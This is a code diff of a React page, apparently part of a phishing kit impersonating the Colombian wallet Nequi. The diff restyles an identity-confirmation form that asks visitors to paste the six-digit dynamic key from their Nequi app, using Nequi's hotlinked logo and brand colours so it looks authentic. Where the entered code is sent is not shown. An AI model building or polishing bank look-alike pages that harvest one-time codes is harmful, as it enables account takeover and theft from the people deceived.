@@ -79,67 +79,62 @@ export default function OtpPage() {
   };
 
   return (
-    <main className="min-h-screen bg-gradient-to-br from-pink-50 to-purple-50">
-      {/* Navbar */}
-      <nav className="bg-white shadow-sm px-4 py-3">
-        <div className="max-w-7xl mx-auto flex items-center justify-between">
-          <Image
-            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
-            alt="Nequi Logo"
-            width={120}
-            height={40}
-            priority
-          />
-          <span className="text-sm text-gray-600">Ayuda</span>
-        </div>
-      </nav>
-
-      {/* Contenido principal */}
-      <div className="container mx-auto px-4 py-8 flex items-center justify-center">
-        <Card className="max-w-md w-full shadow-lg rounded-lg overflow-hidden">
-          <CardHeader className="bg-[#E6007E] p-6">
-            <CardTitle className="text-center text-white text-2xl font-bold">
-              Ingresa tu clave dinámica
-            </CardTitle>
-          </CardHeader>
-          <CardContent className="p-6">
-            <form onSubmit={handleSubmit} className="space-y-6">
-              <div className="space-y-4">
-                <Input
-                  ref={inputRef}
-                  type="text"
-                  placeholder="Clave dinámica"
-                  value={claveDinamica}
-                  onChange={handleChange}
-                  required
-                  aria-label="Clave dinámica"
-                  maxLength={6}
-                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E6007E]"
-                />
-                {error && (
-                  <p className="text-red-500 text-sm mt-2 animate-fade-in">
-                    {error}
-                  </p>
-                )}
-              </div>
-              <Button
-                type="submit"
-                className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white py-3 rounded-lg transition-all duration-300 transform hover:scale-105"
-                disabled={loading || !!error}
-              >
-                {loading ? (
-                  <div className="flex items-center justify-center">
-                    <Loader2 className="animate-spin mr-2" size={20} />
-                    Procesando...
-                  </div>
-                ) : (
-                  "Continuar"
-                )}
-              </Button>
-            </form>
-          </CardContent>
-        </Card>
+    <div className="min-h-screen flex flex-col items-center px-4 py-8 md:py-12">
+      {/* Logo */}
+      <div className="mb-8">
+        <Image
+          src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
+          alt="Nequi Logo"
+          width={120}
+          height={40}
+          className="w-auto h-8"
+        />
       </div>
-    </main>
+
+      {/* Content */}
+      <div className="w-full max-w-md space-y-6 text-center">
+        <h1 className="text-2xl font-semibold text-gray-900">Confirma tu identidad</h1>
+
+        <p className="text-pink-500 text-sm px-6">
+          Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.
+        </p>
+
+        {/* Verification Code Input */}
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <Input
+            ref={inputRef}
+            type="text"
+            maxLength={6}
+            value={claveDinamica}
+            onChange={handleChange}
+            className="text-center tracking-[1em] text-xl font-mono h-12 border-none focus:ring-0 focus-visible:ring-0 focus:outline-none"
+            placeholder="------"
+            required
+            aria-label="Clave dinámica"
+          />
+
+          {error && (
+            <p className="text-red-500 text-sm mt-2 animate-fade-in">
+              {error}
+            </p>
+          )}
+
+          <Button 
+            type="submit" 
+            className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white"
+            disabled={loading || !!error}
+          >
+            {loading ? (
+              <div className="flex items-center justify-center">
+                <Loader2 className="animate-spin mr-2" size={20} />
+                Procesando...
+              </div>
+            ) : (
+              "Confirmar"
+            )}
+          </Button>
+        </form>
+      </div>
+    </div>
   );
 }
